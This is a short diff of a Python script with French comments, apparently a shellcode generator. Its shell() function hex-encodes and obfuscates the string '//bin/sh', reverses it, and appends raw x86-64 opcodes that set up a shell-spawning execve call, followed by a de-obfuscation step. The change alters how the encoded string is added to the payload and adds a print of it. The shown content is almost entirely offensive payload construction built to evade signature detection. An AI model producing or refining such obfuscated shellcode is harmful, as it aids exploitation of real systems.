@@ -182,15 +182,14 @@ def shell():
     factorOffusVar = factorOffus("0x68732f6e69622f2f")
     offuString = offus("0x68732f6e69622f2f",factorOffusVar)
     offuString = offuString[::-1]#Inverse en mirroir tout la chaine pour op code
+
     PAYLOAD += "48bb"  #mov rbx, ...
-    for i in range(0,15,2):
-        sub = offuString[i+1] + offuString[i] 
-        PAYLOAD+= sub
-                    #.../bin/bash en hexa offusqué    
+    PAYLOAD+=offuString[:-2] #.../bin/bash en hexa offusqué sans "x0"
     PAYLOAD+="4889e7" # mov rdi, rsp
     PAYLOAD+="50" #push rax
     PAYLOAD+="57" #push rdi
     PAYLOAD+="4889e6" #mov rsi, rsp
+    print(PAYLOAD)
 
     #Désoffuscation
     #On a add donc on va re sub la différence additionnée
